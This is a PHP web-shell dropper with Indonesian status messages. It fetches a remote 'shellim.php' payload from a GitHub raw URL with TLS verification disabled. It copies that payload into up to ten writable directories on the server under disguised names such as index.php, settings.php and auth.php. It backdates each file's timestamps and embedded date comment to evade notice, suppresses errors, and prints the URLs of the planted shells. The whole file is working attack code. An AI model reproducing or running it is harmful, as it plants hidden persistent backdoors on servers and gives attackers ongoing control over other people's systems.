<?php
ignore_user_abort(true);
set_time_limit(0);
ini_set('display_errors', 0);
error_reporting(0);

$remoteFile = 'https://raw.githubusercontent.com/riko-cup/public/refs/heads/main/shellim.php';

function fetch_from_url($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_USERAGENT => 'Mozilla/5.0',
        ]);
        $data = curl_exec($ch);
        curl_close($ch);
        return $data;
    } else {
        return @file_get_contents($url);
    }
}

function scanWritableDirs($baseDir, $maxDepth = 5, $currentDepth = 0) {
    $result = [];
    if ($currentDepth > $maxDepth) return $result;
    $items = @scandir($baseDir);
    if (!$items) return $result;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $fullPath = rtrim($baseDir, '/') . '/' . $item;
        if (is_dir($fullPath)) {
            if (is_writable($fullPath)) {
                $result[] = $fullPath;
            }
            $result = array_merge($result, scanWritableDirs($fullPath, $maxDepth, $currentDepth + 1));
        }
    }
    return $result;
}

function generate_random_datetime() {
    $year = rand(2021, 2023);
    $month = rand(1, 12);
    $day = rand(1, cal_days_in_month(CAL_GREGORIAN, $month, $year));
    $hour = rand(0, 23);
    $minute = rand(0, 59);
    return sprintf('%04d-%02d-%02d %02d:%02d', $year, $month, $day, $hour, $minute);
}

$originalContent = fetch_from_url($remoteFile);

if (!$originalContent || strlen($originalContent) < 10) {
    exit("❌ Gagal mengunduh konten dari GitHub.<br>\n");
}

$allWritable = scanWritableDirs(__DIR__, 10);

if (empty($allWritable)) {
    exit("❌ Tidak ada folder writable ditemukan.<br>\n");
}

shuffle($allWritable);

$filenames = ['index.php', 'settings.php', 'auth.php'];
$successCount = 0;
$uploadedURLs = [];

foreach ($allWritable as $folder) {
    if ($successCount >= 10) break; // stop kalau sudah 10 file

    $randomDateTime = generate_random_datetime();
    $timestamp = strtotime($randomDateTime);

    $modifiedContent = preg_replace(
        '/(\/\/\s*Tanggal:\s*)\d{4}-\d{2}-\d{2} \d{2}:\d{2}/i',
        '${1}' . $randomDateTime,
        $originalContent
    );

    // pilih nama file random
    $filename = $filenames[array_rand($filenames)];
    $target = $folder . DIRECTORY_SEPARATOR . $filename;

    if (@file_put_contents($target, $modifiedContent)) {
        @touch($target, $timestamp, $timestamp);

        $relativePath = str_replace(realpath($_SERVER['DOCUMENT_ROOT']), '', realpath($folder));
        $relativePath = str_replace('\\', '/', $relativePath); // Windows compatibility
        $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
        $host = $_SERVER['HTTP_HOST'];
        $url = rtrim($protocol . '://' . $host . $relativePath, '/') . '/' . $filename;

        $successCount++;
        $uploadedURLs[] = $url;
    }
}

if ($successCount > 0) {
    echo "✅ Berhasil menyimpan ke $successCount file:<br>\n";
    foreach ($uploadedURLs as $url) {
        echo $url . "<br>\n";
    }
} else {
    echo "❌ Gagal menyalin ke folder manapun.<br>\n";
}

?>
